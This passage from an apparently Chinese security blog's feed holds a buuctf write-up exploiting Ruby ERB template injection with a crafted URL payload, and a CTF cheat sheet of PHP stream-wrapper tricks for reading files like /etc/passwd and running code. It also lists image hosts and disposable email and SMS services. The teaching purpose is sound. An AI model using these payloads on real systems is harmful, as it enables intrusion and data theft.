get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span>

post <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>

    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"error"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"no enough jkl"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span>

    auth <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">flag</span><span class="token operator">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"success"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"jkl is good thing"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>


<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>
  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>
    redirect to<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>rubyè¯­è¨€ã€‚ã€‚ã€‚å°†å°±ç€çœ‹å§ï¼Œç»“åˆgptè§£é‡Šè¿˜æœ‰è¯­è¨€çš„é€šæ€§ï¼Œå…³æ³¨é‡è¦ä»£ç ï¼š</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å½“doå’Œnameå€¼ç›¸ç­‰çš„æ—¶å€™ä¼šè¾“å‡ºkeyã€‚wpè¯´å­˜åœ¨erbæ¨¡æ¿æ³¨å…¥ï¼Œæ³¨å…¥æ ¼å¼ä¸º<code>&lt;%= code %&gt;</code>ï¼Œè¿™é‡Œå·²ç»å­˜åœ¨5ä¸ªå­—ç¬¦ï¼Œè¿˜å·®2ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯èƒ½æ§åˆ¶çš„å­—ç¬¦åªæœ‰2ä¸ªå­—ç¬¦ã€‚<br>ç‰¹æ€§è¯·çœ‹<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">æ–‡æ¡£</a><br><code>if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code><br>ç›´æ¥æ‹¿ç¯å¢ƒé‡Œçš„<code>secret</code>è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå¦‚æœè¾“å…¥<code>SECRET=</code>å°±æ˜¯æ— å­—ç¬¦åŒ¹é…ï¼Œè¿™æ˜¯<code>$&#39;</code>å°±æ˜¯<code>ENV[&#39;SECRET&#39;]</code>äº†<br>ä»æºç ä¸­å¯ä»¥çŸ¥é“å¯ä»¥ç›´æ¥å›æ˜¾<code>&lt;%=$&#39;%&gt;</code><br>é€šè¿‡ä½¿ç”¨<code>name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working</code><br>æ„é€ å‡ºä¸‹é¢çš„Payloadï¼š</p>
<blockquote>
<p><code>/work?SECRET=&amp;name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working</code><br>ç„¶åè¿›è¡Œurlencode<br><code>/work?SECRET=&amp;name=%3C%25%3D$&#39;%25%3E&amp;do=%3C%25%3D$&#39;%25%3E%20is%20working</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/590309a439954af3ad69091153791d70.png" alt="123"></p>
<p>ä½¿ç”¨keyæ›´æ”¹jklå€¼ä»è€Œè´­ä¹°flag<br><img src="https://img-blog.csdnimg.cn/direct/426b57ac539840d2bfb9d09f989a046b.png" alt="798"><br>æ‹¿åˆ°flag<br><img src="https://img-blog.csdnimg.cn/direct/0594c7c9ffa14a24823fd80f5e3baa73.png" alt="123"></p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­å¸¸ç”¨çš„phpä¼ªåè®®æ€»ç»“</title>
    <url>/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">php<span class="token punctuation">:</span><span class="token operator">//</span> â€” è®¿é—®å„ä¸ªè¾“å…¥<span class="token operator">/</span>è¾“å‡ºæµï¼ˆI<span class="token operator">/</span>O streamsï¼‰
<span class="token builtin">file</span><span class="token punctuation">:</span><span class="token operator">//</span> â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
phar<span class="token punctuation">:</span><span class="token operator">//</span> â€” PHP å½’æ¡£
zlib<span class="token punctuation">:</span><span class="token operator">//</span> â€” å‹ç¼©æµ
data<span class="token punctuation">:</span><span class="token operator">//</span> â€” æ•°æ®ï¼ˆRFC <span class="token number">2397</span>ï¼‰
http<span class="token punctuation">:</span><span class="token operator">//</span> â€” è®¿é—® HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> ç½‘å€
ftp<span class="token punctuation">:</span><span class="token operator">//</span> â€” è®¿é—® FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLs
glob<span class="token punctuation">:</span><span class="token operator">//</span> â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
ssh2<span class="token punctuation">:</span><span class="token operator">//</span> â€” Secure Shell <span class="token number">2</span>
rar<span class="token punctuation">:</span><span class="token operator">//</span> â€” RAR
ogg<span class="token punctuation">:</span><span class="token operator">//</span> â€” éŸ³é¢‘æµ
expect<span class="token punctuation">:</span><span class="token operator">//</span> â€” å¤„ç†äº¤äº’å¼çš„æµ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—<code>allow_url_fopen</code>ï¼Œ<code>allow_url_include</code>å½±å“<br> <code>file://</code>åè®®ä¸»è¦ç”¨äºè®¿é—®æ–‡ä»¶(ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠç½‘ç»œè·¯å¾„)<br> æ¯”å¦‚ï¼š<code>http://www.xx.com?file=file:///etc/passsword</code></p>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>åœ¨<code>allow_url_fopen</code>ï¼Œ<code>allow_url_include</code>éƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨<br> <code>php://</code>ä½œç”¨ä¸ºè®¿é—®è¾“å…¥è¾“å‡ºæµ</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>è¯»å–æºä»£ç å¹¶ç¼–ç è¾“å‡ºï¼Œä¾‹å¦‚ï¼š<br> <code>http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</code><br> è¯´æ˜ï¼š<br> <code>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</code> è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµ<br> <code>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code> è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br> <code>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚<br> <code>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code> ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code>æ‰§è¡Œpostæ•°æ®ä¸­çš„ä»£ç ï¼š<br> ä¾‹å¦‚ï¼š<br> <code>http://127.0.0.1/cmd.php?cmd=php://input</code><br> POSTæ•°æ®ï¼š<code>&lt;?php phpinfo()?&gt;</code><br> æ³¨æ„ï¼š<br> å½“<code>enctype=&quot;multipart/form-data&quot;çš„æ—¶å€™</code> php:&#x2F;&#x2F;input&#96; æ˜¯æ— æ•ˆçš„</p>
<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>è‡ªPHP&gt;&#x3D;5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data:&#x2F;&#x2F;æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚ä¸€èˆ¬éœ€è¦ç”¨åˆ°base64ç¼–ç ä¼ è¾“<br> æ¯”å¦‚ï¼š<br> é€šè¿‡data:&#x2F;&#x2F;text&#x2F;plainåè®®æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚<br> <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code><br> <code>url=data://text/plain,&lt;?php print_r(glob(&quot;*&quot;)); ?&gt;</code></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¼˜è´¨å›¾åºŠ</title>
    <url>/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å›¾åºŠ"><a href="#å›¾åºŠ" class="headerlink" title="å›¾åºŠ"></a>å›¾åºŠ</h1><p>ç»™å¤§å®¶æ¨èä¸€äº›å…è´¹å¥½ç”¨çš„ä¼˜è´¨å›¾åºŠï¼š</p>
<p>1ã€SM.MSï¼š<a href="https://sm.ms/">https://sm.ms</a></p>
<p>2ã€imgboxï¼š<a href="https://imgbox.com/">https://imgbox.com</a></p>
<p>3ã€Postimageï¼š<a href="https://postimages.org/">https://postimages.org</a></p>
<p>4ã€imgurlï¼š<a href="https://imgurl.org/">https://imgurl.org</a></p>
<p>5ã€è·¯è¿‡å›¾åºŠï¼š<a href="https://imgchr.com/">https://imgchr.com</a></p>
<p>6ã€Coding å›¾åºŠï¼š<a href="http://picbed.librejo.cn/">http://picbed.librejo.cn</a></p>
<p>7ã€å›¾åº“ï¼š<a href="http://tuku.link/">http://tuku.link</a></p>
<p>8ã€ç‰›å›¾ç½‘ï¼š<a href="https://www.niupic.com/">https://www.niupic.com</a></p>
<p>éœ€è¦ç™»å½•çš„å›¾åºŠï¼š</p>
<p>1ã€imgurï¼š<a href="https://imgur.com/">https://imgur.com</a></p>
<p>2ã€èšåˆå›¾åºŠï¼š<a href="https://www.superbed.cn/">https://www.superbed.cn</a></p>
<p>3ã€hualigsï¼š<a href="https://www.hualigs.cn/">https://www.hualigs.cn</a></p>
<p>4ã€Hello å›¾åºŠï¼š<a href="https://www.helloimg.com/">https://www.helloimg.com</a></p>
]]></content>
      <categories>
        <category>å°å·¥å…·</category>
      </categories>
  </entry>
  <entry>
    <title>ä¸´æ—¶é‚®ç®±å’Œä¸´æ—¶æ‰‹æœºå·</title>
    <url>/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="ä¸´æ—¶é‚®ç®±"><a href="#ä¸´æ—¶é‚®ç®±" class="headerlink" title="ä¸´æ—¶é‚®ç®±"></a>ä¸´æ—¶é‚®ç®±</h1><p>ä¸´æ—¶é‚®ç®±æœ‰ä»€ä¹ˆç”¨ï¼Ÿæœ‰æ—¶å€™æ³¨å†ŒæŸäº›æœåŠ¡å¿…é¡»æä¾›é‚®ç®±ï¼Œä½†ä½ åˆä¸æƒ³ä½¿ç”¨ä½ å¸¸ç”¨çš„é‚®ç®±ï¼Œå› ä¸ºä½ ä¸æƒ³æ”¶åˆ°ä¸å¿…è¦çš„åƒåœ¾é‚®ä»¶ã€‚<br>åˆæœ‰äº›æ—¶å€™ä½ åªæ˜¯æƒ³è¯•ç”¨ä¸€æ¬¡æŸäº›æœåŠ¡ï¼Œä½ ä¸æƒ³ä½¿ç”¨å¸¸ç”¨é‚®ç®±æ³¨å†Œã€‚<br>ä¸´æ—¶é‚®ç®±åº”è¿è€Œç”Ÿï¼Œåœ¨æ³¨å†Œè¿™äº›ä¸é‡è¦çš„æœåŠ¡æ—¶ä½¿ç”¨ä¸´æ—¶é‚®ç®±ä½œä¸ºæ›¿èº«æ˜¯ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚<br>ä¸´æ—¶é‚®ç®±å…·æœ‰åŒ¿åæ€§ï¼Œèƒ½æœ‰æ•ˆå‡å°‘åƒåœ¾é‚®ä»¶ã€‚</p>
<h2 id="é‚®ç®±ç½‘å€"><a href="#é‚®ç®±ç½‘å€" class="headerlink" title="é‚®ç®±ç½‘å€"></a>é‚®ç®±ç½‘å€</h2><p><a href="https://temp-mail.org/zh">https://temp-mail.org/zh</a></p>
<p><a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a></p>
<p><a href="https://10minutemail.net/">https://10minutemail.net</a></p>
<p><a href="https://www.yinsiduanxin.com/mail.html">https://www.yinsiduanxin.com/mail.html</a></p>
<p><a href="https://bccto.me/">https://bccto.me</a></p>
<p><a href="https://www.guerrillamail.com/zh">https://www.guerrillamail.com/zh</a></p>
<p><a href="http://mailcatch.com/">http://mailcatch.com</a></p>
<p><a href="https://10minutemail.com/">https://10minutemail.com</a></p>
<p><a href="http://www.yopmail.com/zh">http://www.yopmail.com/zh</a></p>
<p><a href="https://9em.org/">https://9em.org</a></p>
<p><a href="http://0x5f3759df.cn/">http://0x5f3759df.cn</a></p>
<h1 id="æ‰‹æœºå·"><a href="#æ‰‹æœºå·" class="headerlink" title="æ‰‹æœºå·"></a>æ‰‹æœºå·</h1><p>ä¸´æ—¶æ‰‹æœºå·æœ‰ä»€ä¹ˆç”¨ï¼Ÿæœ‰æ—¶å€™æ³¨å†ŒæŸäº›æœåŠ¡å¿…é¡»æä¾›æ‰‹æœºå·ï¼Œä½†ä½ åˆä¸æƒ³ä½¿ç”¨ä½ å¸¸ç”¨çš„æ‰‹æœºå·ï¼Œå› ä¸ºä½ ä¸æƒ³æ”¶åˆ°ä¸å¿…è¦çš„åƒåœ¾çŸ­ä¿¡ã€‚<br>åˆæœ‰äº›æ—¶å€™ä½ åªæ˜¯æƒ³è¯•ç”¨ä¸€æ¬¡æŸäº›æœåŠ¡ï¼Œä½ ä¸æƒ³ä½¿ç”¨å¸¸ç”¨æ‰‹æœºå·æ³¨å†Œã€‚<br>ä¸´æ—¶æ‰‹æœºå·åº”è¿è€Œç”Ÿï¼Œåœ¨æ³¨å†Œè¿™äº›ä¸é‡è¦çš„æœåŠ¡æ—¶ä½¿ç”¨ä¸´æ—¶æ‰‹æœºå·ä½œä¸ºæ›¿èº«æ˜¯ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚<br>ä¸´æ—¶æ‰‹æœºå·å…·æœ‰åŒ¿åæ€§ï¼Œèƒ½æœ‰æ•ˆå‡å°‘åƒåœ¾çŸ­ä¿¡ã€‚</p>
<p>è¿™é‡Œæˆ‘ç»™å¤§å®¶æ¨èä¸€äº›å¥½ç”¨çš„å›½å†…å¤–å…è´¹çŸ­ä¿¡æ¥ç å¹³å°ï¼š</p>
<h2 id="æ‰‹æœºå·ç½‘å€"><a href="#æ‰‹æœºå·ç½‘å€" class="headerlink" title="æ‰‹æœºå·ç½‘å€"></a>æ‰‹æœºå·ç½‘å€</h2><p>1ã€SMS Receive Freeï¼š<a href="https://smsreceivefree.com/">https://smsreceivefree.com</a></p>
<p>2ã€äº‘æ¥ç ï¼š<a href="https://yunjiema.net/">https://yunjiema.net</a></p>
<p>3ã€å°é¸Ÿæ¥ç ï¼š<a href="http://www.xnsms.com/">http://www.xnsms.com</a></p>
<p>4ã€æ¥ç å·ï¼š<a href="https://jiemahao.com/">https://jiemahao.com</a></p>
<p>5ã€shejiinnï¼š<a href="https://www.shejiinn.com/">https://www.shejiinn.com</a></p>
<p>6ã€mffacï¼š<a href="https://www.mffac.com/">https://www.mffac.com</a></p>
<p>7ã€äº‘çŸ­ä¿¡ï¼š<a href="https://yunduanxin.net/">https://yunduanxin.net</a></p>
<p>8ã€å…è´¹æ¥ç ï¼š<a href="https://mianfeijiema.com/">https://mianfeijiema.com</a></p>
<p>9ã€FreePhoneNumï¼š<a href="https://freephonenum.com/">https://freephonenum.com</a></p>
<p>10ã€ZUSMSï¼š<a href="https://www.zusms.com/">https://www.zusms.com</a></p>
<p>11ã€Free Online Phoneï¼š<a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org</a></p>
<p>12ã€receiveasmsï¼š<a href="https://receiveasms.com/">https://receiveasms.com</a></p>
<p>13ã€materialtoolsï¼š<a href="https://www.materialtools.com/">https://www.materialtools.com</a></p>
